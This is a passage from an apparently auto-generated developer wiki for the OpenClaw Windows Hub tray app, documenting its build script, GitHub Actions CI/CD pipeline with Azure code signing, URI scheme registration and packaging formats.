Sources: [.github/workflows/ci.yml:286-291](), [.github/workflows/ci.yml:342-352](), [README.md:56-58]()

---

## Release Artifacts Table

| Artifact | Architecture | File Name Pattern | Purpose | Signing |
|----------|--------------|-------------------|---------|---------|
| Inno Setup Installer | x64 | `OpenClawTray-Setup-x64.exe` | End-user installation with auto-start option | ✅ Azure Trusted Signing |
| Inno Setup Installer | ARM64 | `OpenClawTray-Setup-arm64.exe` | End-user installation for ARM devices | ✅ Azure Trusted Signing |
| Portable ZIP | x64 | `OpenClawTray-{version}-win-x64.zip` | Portable deployment + auto-update | Contents signed |
| Portable ZIP | ARM64 | `OpenClawTray-{version}-win-arm64.zip` | Portable deployment + auto-update | Contents signed |
| MSIX Package | x64 | `OpenClawTray-{version}-win-x64.msix` | Modern deployment with camera/mic consent | ✅ Azure Trusted Signing |
| MSIX Package | ARM64 | `OpenClawTray-{version}-win-arm64.msix` | Modern deployment with camera/mic consent | ✅ Azure Trusted Signing |

**Naming Convention:**

The ZIP archives follow the Updatum-compatible naming pattern: `{AppName}-{Version}-{RID}.zip`, where RID must include `win-x64` or `win-arm64` for the auto-updater to recognize the correct architecture.

Sources: [.github/workflows/ci.yml:353-376](), [.github/workflows/ci.yml:286-291]()

---

## WebView2 Runtime Handling

The WinUI tray application requires WebView2Loader.dll to be present in the output directory for unpackaged builds. A custom MSBuild target handles this:

```xml
<Target Name="CopyWebView2Loader" AfterTargets="Build" Condition="'$(PackageMsix)' != 'true'">
  <PropertyGroup>
    <!-- Detect ARM64 via RuntimeIdentifier, Platform, or processor architecture -->
    <IsArm64Build Condition="'$(Platform)' == 'ARM64' OR '$(RuntimeIdentifier)' == 'win-arm64' OR '$(PROCESSOR_ARCHITECTURE)' == 'ARM64'">true</IsArm64Build>
    <WebView2LoaderSource Condition="'$(IsArm64Build)' == 'true'">$(OutputPath)runtimes\win-arm64\native\WebView2Loader.dll</WebView2LoaderSource>
    <WebView2LoaderSource Condition="'$(WebView2LoaderSource)' == ''">$(OutputPath)runtimes\win-x64\native\WebView2Loader.dll</WebView2LoaderSource>
  </PropertyGroup>
  <Copy SourceFiles="$(WebView2LoaderSource)" DestinationFolder="$(OutputPath)" SkipUnchangedFiles="true" Condition="Exists('$(WebView2LoaderSource)')" />
</Target>
```

This target:
1. Runs after the Build target
2. Only executes for unpackaged builds (`PackageMsix != true`)
3. Detects the target architecture from multiple sources
4. Copies the appropriate architecture-specific WebView2Loader.dll to the output root

Sources: [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:51-60]()

---

## URI Scheme Registration

The `openclaw://` URI scheme is registered differently depending on the build mode:

**Packaged (MSIX) Mode:**

The URI scheme is declared in `Package.appxmanifest`:

```xml
<Extensions>
  <uap:Extension Category="windows.protocol">
    <uap:Protocol Name="openclaw">
      <uap:DisplayName>OpenClaw Protocol</uap:DisplayName>
    </uap:Protocol>
  </uap:Extension>
</Extensions>
```

**Unpackaged Mode:**

The URI scheme is registered in the Windows Registry at runtime:

```
HKEY_CURRENT_USER\SOFTWARE\Classes\openclaw
  - (Default) = "URL:OpenClaw Protocol"
  - URL Protocol = ""
  - DefaultIcon\(Default) = "path\to\exe,0"
  - shell\open\command\(Default) = "path\to\exe" "%1"
```

The `DeepLinkHandler.RegisterUriScheme()` method handles this registration and automatically skips it for packaged builds.

Sources: [src/OpenClaw.Tray.WinUI/Package.appxmanifest:45-52](), [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:15-44]()

---

# Page: Build System

# Build System

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [README.md](README.md)
- [build.ps1](build.ps1)
- [src/OpenClaw.Shared/OpenClaw.Shared.csproj](src/OpenClaw.Shared/OpenClaw.Shared.csproj)

</details>



This page documents the local build system for the OpenClaw Windows Hub monorepo, including the `build.ps1` PowerShell script, prerequisite validation, project structure, and compilation requirements. For information about the CI/CD pipeline and automated builds, see [CI/CD Pipeline](#6.2). For packaging formats and distribution, see [Packaging & Distribution](#6.3).

## Build Script Overview

The primary build interface is `build.ps1`, a PowerShell script that validates prerequisites, determines the correct runtime identifier based on system architecture, and builds one or more projects in the monorepo.

### Build Script Parameters

| Parameter | Values | Default | Description |
|-----------|--------|---------|-------------|
| `Project` | `All`, `Tray`, `WinUI`, `Shared`, `CommandPalette` | `All` | Which project(s) to build |
| `Configuration` | `Debug`, `Release` | `Debug` | Build configuration |
| `CheckOnly` | Switch | - | Only validate prerequisites, skip build |

**Sources:** [build.ps1:25-33]()

### Build Script Execution Flow

```mermaid
flowchart TD
    Start["build.ps1 invoked"]
    ParseParams["Parse parameters<br/>(Project, Configuration, CheckOnly)"]
    CheckOS["Check OS == Windows_NT"]
    CheckDotnet["Check dotnet --version"]
    CheckNet10["Check .NET 10 SDK in dotnet --list-sdks"]
    CheckWinSDK["Check Windows 10 SDK<br/>at ProgramFiles(x86)/Windows Kits/10"]
    CheckWebView2["Check WebView2 Registry Keys<br/>HKLM/HKCU EdgeUpdate Clients"]
    DetectArch["Detect PROCESSOR_ARCHITECTURE<br/>(ARM64 or x64)"]
    Summary["Display prerequisite summary"]
    CheckOnlyExit{"CheckOnly<br/>flag?"}
    DetermineRID["Determine runtime identifier:<br/>win-arm64 or win-x64"]
    SelectProjects["Select projects to build:<br/>All → Shared, Tray, WinUI<br/>Other → Shared + requested"]
    BuildLoop["For each project:<br/>Call Build-Project function"]
    BuildProject["dotnet build with -r flag (WinUI)<br/>or without (others)"]
    BuildSummary["Display build summary<br/>Success count, fail count"]
    Exit["Exit with code 0 (success)<br/>or 1 (failure)"]
    
    Start --> ParseParams
    ParseParams --> CheckOS
    CheckOS --> CheckDotnet
    CheckDotnet --> CheckNet10
    CheckNet10 --> CheckWinSDK
    CheckWinSDK --> CheckWebView2
    CheckWebView2 --> DetectArch
    DetectArch --> Summary
    Summary --> CheckOnlyExit
    CheckOnlyExit -->|Yes| Exit
    CheckOnlyExit -->|No| DetermineRID
    DetermineRID --> SelectProjects
    SelectProjects --> BuildLoop
    BuildLoop --> BuildProject
    BuildProject --> BuildLoop
    BuildLoop --> BuildSummary
    BuildSummary --> Exit
```

**Sources:** [build.ps1:54-241]()

## Prerequisites

The build system validates the following prerequisites before building:

### Required Prerequisites

| Prerequisite | Validation Method | Location |
|-------------|-------------------|----------|
| Windows OS | `$env:OS -ne "Windows_NT"` | [build.ps1:61-64]() |
| .NET SDK (any version) | `dotnet --version` | [build.ps1:68-76]() |
| .NET 10 SDK | `dotnet --list-sdks` match `^10\.` | [build.ps1:80-90]() |

### Optional Prerequisites

| Prerequisite | Needed For | Validation Method |
|-------------|------------|-------------------|
| Windows 10 SDK | WinUI builds | Check directory: `${env:ProgramFiles(x86)}\Windows Kits\10\Include` |
| WebView2 Runtime | WinUI chat window | Registry keys: `HKLM:\SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}` or `HKCU:\SOFTWARE\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}` |

**Sources:** [build.ps1:94-121](), [README.md:24-28]()

### Architecture Detection

The build script automatically detects the processor architecture using `$env:PROCESSOR_ARCHITECTURE` and selects the appropriate runtime identifier:

- `ARM64` → `win-arm64`
- `AMD64` or other → `win-x64`

**Sources:** [build.ps1:124-128](), [build.ps1:154-155]()

## Project Structure and Dependencies

The monorepo contains four .NET projects with specific dependency relationships:

```mermaid
graph TD
    Shared["OpenClaw.Shared<br/>Class Library<br/>net10.0"]
    Tray["OpenClaw.Tray<br/>WinForms App<br/>net10.0-windows"]
    WinUI["OpenClaw.Tray.WinUI<br/>WinUI App<br/>net10.0-windows10.0.19041.0"]
    CommandPalette["OpenClaw.CommandPalette<br/>PowerToys Extension<br/>net10.0-windows10.0.19041.0"]
    
    Tray -->|References| Shared
    WinUI -->|References| Shared
    CommandPalette -->|References| Shared
    
    Shared -.->|InternalsVisibleTo| SharedTests["OpenClaw.Shared.Tests"]
```

**Sources:** [README.md:280-292](), [build.ps1:188-193](), [src/OpenClaw.Shared/OpenClaw.Shared.csproj:11-12]()

### Project Build Order

When building with `-Project All` or when building a project that depends on `OpenClaw.Shared`, the build script ensures `Shared` is built first:

```mermaid
flowchart LR
    SelectProjects["Select projects to build"]
    CheckShared{"Building non-Shared<br/>non-All project?"}
    PrependShared["Prepend 'Shared' to build list"]
    BuildSequence["Execute builds in order"]
    
    SelectProjects --> CheckShared
    CheckShared -->|Yes| PrependShared
    CheckShared -->|No| BuildSequence
    PrependShared --> BuildSequence
```

**Sources:** [build.ps1:195-200]()

## Build Configurations

### Configuration Options

The build system supports two standard .NET configurations:

- **Debug** (default): Includes debug symbols, no optimizations
- **Release**: Optimized code, used for distribution

**Sources:** [build.ps1:29-30]()

### Runtime Identifier Requirement

The `OpenClaw.Tray.WinUI` project **requires** a runtime identifier (`-r` flag) for all builds because it uses self-contained WebView2 support. Other projects build without a runtime identifier.

| Project | Requires `-r` | Reason |
|---------|---------------|--------|
| `OpenClaw.Shared` | No | Class library |
| `OpenClaw.Tray` | No | Framework-dependent WinForms app |
| `OpenClaw.Tray.WinUI` | **Yes** | Self-contained WinUI with WebView2 |
| `OpenClaw.CommandPalette` | No | Framework-dependent MSIX extension |

**Sources:** [build.ps1:159-172](), [build.ps1:168-172]()

### Build Function Implementation

The `Build-Project` function handles both runtime-identifier and non-runtime-identifier builds:

```mermaid
flowchart TD
    BuildProject["Build-Project(name, path, useRid)"]
    CheckPath{"Project file<br/>exists?"}
    CheckRID{"useRid<br/>parameter?"}
    BuildWithRID["dotnet build $path -c $Configuration -r $rid"]
    BuildNoRID["dotnet build $path -c $Configuration"]
    CheckExit{"Exit code<br/>== 0?"}
    Success["Return true"]
    Failure["Display error lines<br/>Return false"]
    
    BuildProject --> CheckPath
    CheckPath -->|No| Failure
    CheckPath -->|Yes| CheckRID
    CheckRID -->|Yes| BuildWithRID
    CheckRID -->|No| BuildNoRID
    BuildWithRID --> CheckExit
    BuildNoRID --> CheckExit
    CheckExit -->|Yes| Success
    CheckExit -->|No| Failure
```

**Sources:** [build.ps1:159-186]()

## Build Targets

### Using the Build Script

```powershell
# Check prerequisites only
.\build.ps1 -CheckOnly

# Build all projects (Shared, Tray, WinUI) in Debug
.\build.ps1

# Build specific project in Release
.\build.ps1 -Project WinUI -Configuration Release

# Build WinForms tray app
.\build.ps1 -Project Tray

# Build shared library only
.\build.ps1 -Project Shared
```

**Sources:** [README.md:33-44]()

### Project Definitions Table

The build script defines projects in a hashtable with their paths and runtime identifier requirements:

| Key | Path | UseRid |
|-----|------|--------|
| `"Shared"` | `src/OpenClaw.Shared/OpenClaw.Shared.csproj` | `$false` |
| `"Tray"` | `src/OpenClaw.Tray/OpenClaw.Tray.csproj` | `$false` |
| `"WinUI"` | `src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj` | `$true` |
| `"CommandPalette"` | `src/OpenClaw.CommandPalette/OpenClaw.CommandPalette.csproj` | `$false` |

**Sources:** [build.ps1:188-193]()

## Direct Build Commands

Developers can bypass `build.ps1` and use `dotnet` commands directly, but must manually specify runtime identifiers for WinUI builds.

### Building All Projects

```powershell
# Build entire solution (WARNING: WinUI build will fail without -r flag)
dotnet build
```

**Sources:** [README.md:49-50]()

### Building WinUI Tray Application

```powershell
# ARM64 build
dotnet build src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj -r win-arm64

# x64 build
dotnet build src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj -r win-x64

# MSIX package (for camera/mic permissions)
dotnet build src/OpenClaw.Tray.WinUI -r win-arm64 -p:PackageMsix=true
dotnet build src/OpenClaw.Tray.WinUI -r win-x64 -p:PackageMsix=true
```

**Sources:** [README.md:52-58]()

### Building WinForms Tray Application

```powershell
# No runtime identifier needed
dotnet build src/OpenClaw.Tray/OpenClaw.Tray.csproj
```

**Sources:** [README.md:46-47]()

## Build Output Locations

The build output directory structure varies by project and runtime identifier:

```mermaid
graph TD
    Root["Repository Root"]
    Src["src/"]
    
    SharedBin["OpenClaw.Shared/bin/Debug/net10.0/"]
    TrayBin["OpenClaw.Tray/bin/Debug/net10.0-windows/"]
    WinUIBin["OpenClaw.Tray.WinUI/bin/Debug/<br/>net10.0-windows10.0.19041.0/"]
    WinUIx64["win-x64/<br/>OpenClaw.Tray.WinUI.exe"]
    WinUIarm64["win-arm64/<br/>OpenClaw.Tray.WinUI.exe"]
    
    Root --> Src
    Src --> SharedBin
    Src --> TrayBin
    Src --> WinUIBin
    WinUIBin --> WinUIx64
    WinUIBin --> WinUIarm64
```

### Running Built Applications

After building, the WinUI application must be run from its runtime-specific output directory:

```powershell
# ARM64
.\src\OpenClaw.Tray.WinUI\bin\Debug\net10.0-windows10.0.19041.0\win-arm64\OpenClaw.Tray.WinUI.exe

# x64
.\src\OpenClaw.Tray.WinUI\bin\Debug\net10.0-windows10.0.19041.0\win-x64\OpenClaw.Tray.WinUI.exe
```

The WinForms application can be run using `dotnet run`:

```powershell
dotnet run --project src/OpenClaw.Tray/OpenClaw.Tray.csproj
```

**Sources:** [README.md:62-70](), [build.ps1:230-236]()

## Build Summary Output

The build script displays a color-coded summary showing success/failure for each project and provides next-step instructions:

```mermaid
flowchart TD
    BuildComplete["All builds complete"]
    CountResults["Count successful and failed builds"]
    ShowResults["Display ✅/❌ for each project"]
    CheckFailures{"Any failures?"}
    ShowSuccess["Display '🦞 All builds succeeded!'<br/>Show run commands"]
    ShowFailure["Display '❌ N build(s) failed'<br/>Exit code 1"]
    
    BuildComplete --> CountResults
    CountResults --> ShowResults
    ShowResults --> CheckFailures
    CheckFailures -->|No| ShowSuccess
    CheckFailures -->|Yes| ShowFailure
```

**Sources:** [build.ps1:210-242]()

---

# Page: CI/CD Pipeline

# CI/CD Pipeline

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/workflows/ci.yml](.github/workflows/ci.yml)
- [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs](src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs)

</details>



This document describes the automated build, test, package, and release pipeline for the OpenClaw Windows Hub. The CI/CD system uses GitHub Actions to produce multi-architecture builds, sign all artifacts with Azure Trusted Signing, and automatically publish releases to GitHub.

For information about the build scripts and local development builds, see [Build System](#6.1). For details on the resulting packages and their distribution, see [Packaging & Distribution](#6.3). For versioning strategy and auto-updates, see [Versioning & Updates](#6.4).

---

## Workflow Overview

The CI/CD pipeline is defined in [.github/workflows/ci.yml:1-382]() and consists of five interdependent jobs that execute in a directed acyclic graph:

**Workflow Name:** `Build and Test`

**Job Execution Flow:**
```mermaid
graph TB
    test["test<br/>(GitVersion, unit tests)"]
    build["build<br/>(WinUI x64 + arm64)"]
    buildmsix["build-msix<br/>(MSIX x64 + arm64)"]
    buildext["build-extension<br/>(PowerToys x64 + arm64)"]
    release["release<br/>(Inno installers, GitHub Release)"]
    
    test --> build
    test --> buildmsix
    test --> buildext
    test --> release
    build --> release
    buildmsix --> release
    buildext --> release
```

**Sources:** [.github/workflows/ci.yml:10-228]()

---

## Workflow Triggers

The pipeline executes under three conditions:

| Trigger Type | Condition | Purpose |
|-------------|-----------|---------|
| **Push to main/master** | [.github/workflows/ci.yml:4-5]() | Continuous integration on mainline |
| **Pull Request** | [.github/workflows/ci.yml:7-8]() | Pre-merge validation |
| **Version Tag** | `refs/tags/v*` pattern | Production release with code signing |

Only builds triggered by version tags (e.g., `v0.4.4`) will perform code signing and create GitHub releases.

**Sources:** [.github/workflows/ci.yml:3-8]()

---

## Test Job

The `test` job runs on `windows-latest` and performs dependency restoration, compilation, and unit test execution for all projects.

```mermaid
graph LR
    checkout["Checkout<br/>(fetch-depth: 0)"]
    dotnet["Setup .NET 10"]
    gitversion["GitVersion Setup<br/>(6.4.x)"]
    version["Determine Version"]
    restore["Restore dependencies"]
    buildshared["Build OpenClaw.Shared"]
    buildwinforms["Build OpenClaw.Tray"]
    buildwinui["Build OpenClaw.Tray.WinUI"]
    buildtests["Build Tests"]
    runtests["Run Tests"]
    
    checkout --> dotnet
    dotnet --> gitversion
    gitversion --> version
    version --> restore
    restore --> buildshared
    buildshared --> buildwinforms
    buildwinforms --> buildwinui
    buildwinui --> buildtests
    buildtests --> runtests
```

**Key Outputs:**
- `semVer` - Full semantic version (e.g., `0.4.4-beta.1`)
- `majorMinorPatch` - Three-part version (e.g., `0.4.4`)

These version outputs are consumed by all dependent jobs via `needs.test.outputs.semVer` and `needs.test.outputs.majorMinorPatch`.

**Sources:** [.github/workflows/ci.yml:11-52]()

---

## Build Job (WinUI Tray Application)

The `build` job uses a matrix strategy to produce self-contained executables for both x64 and ARM64 architectures:

```mermaid
graph TB
    subgraph "Matrix Strategy"
        x64["win-x64"]
        arm64["win-arm64"]
    end
    
    subgraph "Build Steps (per architecture)"
        restore["dotnet restore<br/>-r {matrix.rid}"]
        build["dotnet build<br/>-c Release -r {matrix.rid}<br/>-p:Version={semVer}"]
        publish["dotnet publish<br/>--self-contained"]
        sign["Azure Trusted Signing<br/>(if tag v*)"]
        upload["Upload artifact<br/>openclaw-tray-{rid}"]
    end
    
    x64 --> restore
    arm64 --> restore
    restore --> build
    build --> publish
    publish --> sign
    sign --> upload
```

**Runtime Identifiers:** `win-x64`, `win-arm64` [.github/workflows/ci.yml:59]()

**Signing Configuration:**
- Enabled only for tag pushes: [.github/workflows/ci.yml:79]()
- Uses Azure Trusted Signing action: [.github/workflows/ci.yml:84-98]()
- Endpoint: `https://wus2.codesigning.azure.net/`
- Certificate profile: `WindowsEdgeLight`
- Filters for `.exe` files in the `publish/` folder

**Artifacts Produced:**
- `openclaw-tray-win-x64/` - Contains `OpenClaw.Tray.WinUI.exe` and dependencies
- `openclaw-tray-win-arm64/` - ARM64 version

**Sources:** [.github/workflows/ci.yml:54-105]()

---

## Build-MSIX Job

The `build-msix` job creates MSIX packages for Windows Store-style deployment. This job has `continue-on-error: true` as MSIX packaging can be fragile.

```mermaid
graph TB
    subgraph "Platform Mapping"
        x64rid["win-x64 → platform: x64"]
        arm64rid["win-arm64 → platform: ARM64"]
    end
    
    subgraph "MSIX Build Process"
        restore["dotnet restore<br/>-r {matrix.rid}"]
        patch["Patch MSIX manifest<br/>Package.appxmanifest<br/>Version={majorMinorPatch}.0"]
        msbuild["msbuild<br/>/p:PackageMsix=true<br/>/p:GenerateAppxPackageOnBuild=true<br/>/p:AppxPackageSigningEnabled=false"]
        find["Find MSIX Package<br/>(PowerShell search)"]
        sign["Sign MSIX<br/>(if tag v*)"]
        upload["Upload artifact<br/>openclaw-msix-{rid}"]
    end
    
    x64rid --> restore
    arm64rid --> restore
    restore --> patch
    patch --> msbuild
    msbuild --> find
    find --> sign
    sign --> upload
```

**MSIX Version Patching:**

The MSIX manifest requires a four-part version (e.g., `0.4.4.0`). The pipeline patches `Package.appxmanifest` at [.github/workflows/ci.yml:134-142]():

```powershell
$version = "${{ needs.test.outputs.majorMinorPatch }}.0"
$manifest = "src/OpenClaw.Tray.WinUI/Package.appxmanifest"
[xml]$xml = Get-Content $manifest
$xml.Package.Identity.Version = $version
$xml.Save((Resolve-Path $manifest))
```

**MSBuild Properties:**
- `PackageMsix=true` - Enable MSIX packaging
- `GenerateAppxPackageOnBuild=true` - Generate package during build
- `AppxPackageSigningEnabled=false` - Disable default signing (Azure signs later)
- `UapAppxPackageBuildMode=SideloadOnly` - Sideload-only package

**Sources:** [.github/workflows/ci.yml:106-199]()

---

## Build-Extension Job

The `build-extension` job compiles the PowerToys Command Palette extension for both x64 and ARM64 platforms:

```mermaid
graph LR
    checkout["Checkout"]
    dotnet["Setup .NET 10"]
    restore["Restore<br/>OpenClaw.CommandPalette"]
    build["Build Debug<br/>-p:Platform={matrix.platform}"]
    upload["Upload artifact<br/>openclaw-commandpalette-{platform}"]
    
    checkout --> dotnet
    dotnet --> restore
    restore --> build
    build --> upload
```

**Platform Values:** `x64`, `arm64` (not runtime identifiers)

**Artifacts Produced:**
- `openclaw-commandpalette-x64/` - Contains `AppxManifest.xml` and extension files
- `openclaw-commandpalette-arm64/` - ARM64 version

**Sources:** [.github/workflows/ci.yml:200-226]()

---

## Release Job

The `release` job executes only on version tag pushes and orchestrates the final distribution artifacts:

```mermaid
graph TB
    subgraph "Artifact Download"
        dl1["Download tray artifacts<br/>(x64, arm64)"]
        dl2["Download cmdpal artifacts<br/>(x64, arm64)"]
        dl3["Download MSIX artifacts<br/>(x64, arm64, optional)"]
    end
    
    subgraph "Artifact Transformation"
        rename["Rename MSIX packages<br/>OpenClawTray-{version}-{arch}.msix"]
        zip["Create ZIP archives<br/>OpenClawTray-{version}-{arch}.zip"]
        inno["Build Inno Setup installers<br/>(includes tray + cmdpal)"]
    end
    
    subgraph "Code Signing"
        azlogin["Azure Login"]
        sign["Sign installers<br/>(Output/*.exe)"]
    end
    
    subgraph "GitHub Release"
        ghrelease["Create Release<br/>softprops/action-gh-release"]
    end
    
    dl1 --> rename
    dl2 --> inno
    dl3 --> rename
    rename --> zip
    zip --> inno
    inno --> azlogin
    azlogin --> sign
    sign --> ghrelease
```

### Artifact Downloads

The job downloads all artifacts from previous jobs using `actions/download-artifact@v4`. MSIX downloads have `continue-on-error: true` since the MSIX build job itself is non-blocking.

**Sources:** [.github/workflows/ci.yml:237-276]()

### MSIX Renaming

MSIX packages are renamed to follow a consistent pattern:
- `OpenClawTray-{majorMinorPatch}-win-x64.msix`
- `OpenClawTray-{majorMinorPatch}-win-arm64.msix`

**Sources:** [.github/workflows/ci.yml:277-285]()

### ZIP Archive Creation

ZIP archives are created for Updatum auto-update compatibility. The filename pattern **must** include `win-x64` or `win-arm64` for the auto-updater to detect the correct architecture:

```powershell
Compress-Archive -Path artifacts/tray-win-x64/* -DestinationPath OpenClawTray-{version}-win-x64.zip
Compress-Archive -Path artifacts/tray-win-arm64/* -DestinationPath OpenClawTray-{version}-win-arm64.zip
```

**Sources:** [.github/workflows/ci.yml:287-291]()

### Inno Setup Installer Creation

Inno Setup installers bundle both the tray application and PowerToys Command Palette extension:

```mermaid
graph TB
    subgraph "x64 Installer"
        prep64["Prepare publish-x64/<br/>Copy tray artifacts<br/>Copy cmdpal to cmdpal/"]
        build64["ISCC.exe<br/>/DMyAppVersion={version}<br/>/DMyAppArch=x64<br/>installer.iss"]
        out64["Output/<br/>OpenClawTray-Setup-x64.exe"]
    end
    
    subgraph "arm64 Installer"
        prep_arm64["Prepare publish-arm64/<br/>Copy tray artifacts<br/>Copy cmdpal to cmdpal/"]
        build_arm64["ISCC.exe<br/>/DMyAppVersion={version}<br/>/DMyAppArch=arm64<br/>installer.iss"]
        out_arm64["Output/<br/>OpenClawTray-Setup-arm64.exe"]
    end
    
    prep64 --> build64
    build64 --> out64
    prep_arm64 --> build_arm64
    build_arm64 --> out_arm64
```

The script locates the PowerToys extension by finding the `AppxManifest.xml` file and copying its parent directory to `publish-{arch}/cmdpal/`.

**Sources:** [.github/workflows/ci.yml:293-321]()

### Installer Code Signing

After Inno Setup builds the `.exe` installers, they are signed using Azure Trusted Signing:

- Files folder: `Output/`
- Filter: `.exe` files only
- Same signing profile as executables (WindowsEdgeLight)

**Sources:** [.github/workflows/ci.yml:322-341]()

### GitHub Release Creation

The final step creates a GitHub release using `softprops/action-gh-release@v2` with:

**Attached Files:**
- `Output/OpenClawTray-Setup-x64.exe`
- `Output/OpenClawTray-Setup-arm64.exe`
- `OpenClawTray-{version}-win-x64.zip`
- `OpenClawTray-{version}-win-arm64.zip`
- `OpenClawTray-{version}-win-x64.msix` (if available)
- `OpenClawTray-{version}-win-arm64.msix` (if available)

**Release Body Template:** [.github/workflows/ci.yml:353-382]()

The release notes include download instructions, feature highlights, system requirements, and quick start guide.

**Sources:** [.github/workflows/ci.yml:342-382]()

---

## Code Signing Configuration

All production artifacts are signed using Azure Trusted Signing. Signing occurs **only** when the workflow is triggered by a version tag.

```mermaid
graph TB
    subgraph "Signing Trigger"
        check["startsWith(github.ref, 'refs/tags/v')"]
    end
    
    subgraph "Azure Authentication"
        login["azure/login@v2<br/>Service Principal credentials"]
    end
    
    subgraph "Signing Targets"
        exe["Standalone EXEs<br/>(publish/*.exe)"]
        msix["MSIX Packages<br/>(AppPackages/**/*.msix)"]
        installer["Inno Setup Installers<br/>(Output/*.exe)"]
    end
    
    subgraph "Signing Configuration"
        endpoint["Endpoint: wus2.codesigning.azure.net"]
        account["Account: hanselman"]
        profile["Profile: WindowsEdgeLight"]
        digest["SHA256 digest"]
        timestamp["Timestamp: acs.microsoft.com"]
    end
    
    check --> login
    login --> exe
    login --> msix
    login --> installer
    exe --> endpoint
    msix --> endpoint
    installer --> endpoint
    endpoint --> account
    account --> profile
    profile --> digest
    digest --> timestamp
```

**Azure Service Principal Secrets:**
- `AZURE_CLIENT_ID`
- `AZURE_CLIENT_SECRET`
- `AZURE_SUBSCRIPTION_ID`
- `AZURE_TENANT_ID`

These secrets are configured in the GitHub repository settings and passed to the Azure login action.

**File Filters:**
- EXE signing: `files-folder-filter: exe` [.github/workflows/ci.yml:95]()
- MSIX signing: `files-folder-filter: msix`, `files-folder-depth: 3` [.github/workflows/ci.yml:188-189]()

**Sources:** [.github/workflows/ci.yml:78-98](), [.github/workflows/ci.yml:172-192](), [.github/workflows/ci.yml:322-341]()

---

## Environment and Dependencies

**Runner Image:** `windows-latest` (all jobs)

**Required Actions:**
- `actions/checkout@v4` - Repository checkout
- `actions/setup-dotnet@v4` - .NET 10 SDK installation
- `gittools/actions/gitversion/*@v4` - GitVersion tool
- `microsoft/setup-msbuild@v2` - MSBuild (for MSIX)
- `azure/login@v2` - Azure authentication
- `azure/trusted-signing-action@v1` - Code signing
- `actions/upload-artifact@v4` - Artifact storage
- `actions/download-artifact@v4` - Artifact retrieval
- `softprops/action-gh-release@v2` - GitHub release creation

**External Tools:**
- Inno Setup 6 - Installed via `choco install innosetup` [.github/workflows/ci.yml:294]()
- GitVersion 6.4.x - Semantic versioning [.github/workflows/ci.yml:24-26]()

**Sources:** [.github/workflows/ci.yml:1-382]()

---

## Build Matrix Summary

| Job | Architecture | Output Format | Artifact Name |
|-----|-------------|--------------|---------------|
| `build` | x64, arm64 | Self-contained EXE | `openclaw-tray-{rid}` |
| `build-msix` | x64, arm64 | MSIX package | `openclaw-msix-{rid}` |
| `build-extension` | x64, arm64 | PowerToys extension | `openclaw-commandpalette-{platform}` |
| `release` | x64, arm64 | Inno Setup installer | `OpenClawTray-Setup-{arch}.exe` |
| `release` | x64, arm64 | ZIP archive | `OpenClawTray-{version}-{arch}.zip` |

**Sources:** [.github/workflows/ci.yml:58-60](), [.github/workflows/ci.yml:111-118](), [.github/workflows/ci.yml:204-205]()

---

## Conditional Logic

The pipeline employs several conditional execution patterns:

| Condition | Purpose | Example |
|-----------|---------|---------|
| `startsWith(github.ref, 'refs/tags/v')` | Code signing and releases | [.github/workflows/ci.yml:79]() |
| `needs: [test, build, ...]` | Job dependencies | [.github/workflows/ci.yml:228]() |
| `continue-on-error: true` | Non-blocking MSIX build | [.github/workflows/ci.yml:109]() |
| `steps.msix-x64.outcome == 'success'` | Optional MSIX renaming | [.github/workflows/ci.yml:278]() |
| `if: !cancelled()` | Release even if MSIX fails | [.github/workflows/ci.yml:229]() |

The MSIX build is allowed to fail without blocking the release, ensuring that standalone EXE and installer distributions are always available.

**Sources:** [.github/workflows/ci.yml:79](), [.github/workflows/ci.yml:109](), [.github/workflows/ci.yml:228-229](), [.github/workflows/ci.yml:278]()

---

# Page: Packaging & Distribution

# Packaging & Distribution

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/workflows/ci.yml](.github/workflows/ci.yml)
- [docs/VERSIONING.md](docs/VERSIONING.md)
- [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj](src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj)
- [src/OpenClaw.Tray.WinUI/Package.appxmanifest](src/OpenClaw.Tray.WinUI/Package.appxmanifest)
- [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs](src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs)
- [src/OpenClaw.Tray/OpenClaw.Tray.csproj](src/OpenClaw.Tray/OpenClaw.Tray.csproj)

</details>



This document describes the four packaging formats produced by the OpenClaw Windows Hub build system and how they are distributed to users. Each format serves different deployment scenarios, from traditional installers to modern MSIX packages with enhanced permissions.

For information about the build process that produces these artifacts, see [Build System](#6.1). For the CI/CD pipeline that automates packaging and release, see [CI/CD Pipeline](#6.2). For version management and auto-update mechanisms, see [Versioning & Updates](#6.4).

## Packaging Formats Overview

The OpenClaw Windows Hub is distributed in four distinct formats:

| Format | File Name Pattern | Use Case | Code Signing | Auto-Update |
|--------|------------------|----------|--------------|-------------|
| Standalone EXE | `OpenClaw.Tray.WinUI.exe` | Development, direct execution | ✓ | ✗ |
| MSIX Package | `OpenClawTray-{version}-{arch}.msix` | Camera/mic consent, sideloading | ✓ | ✗ |
| Inno Setup Installer | `OpenClawTray-Setup-{arch}.exe` | Traditional installation | ✓ | via ZIP |
| Portable ZIP | `OpenClawTray-{version}-{arch}.zip` | Updatum auto-update | ✗ | ✓ |

**Sources:** [.github/workflows/ci.yml:286-352]()

## Packaging Format Details

### Standalone EXE

The standalone executable is a self-contained Windows application built with `WindowsAppSDKSelfContained=true`. This format includes all runtime dependencies and does not require installation.

**Project Configuration:**

```xml
<PropertyGroup Condition="'$(PackageMsix)' != 'true'">
  <WindowsPackageType>None</WindowsPackageType>
  <WindowsAppSDKSelfContained>true</WindowsAppSDKSelfContained>
  <ApplicationManifest>app.manifest</ApplicationManifest>
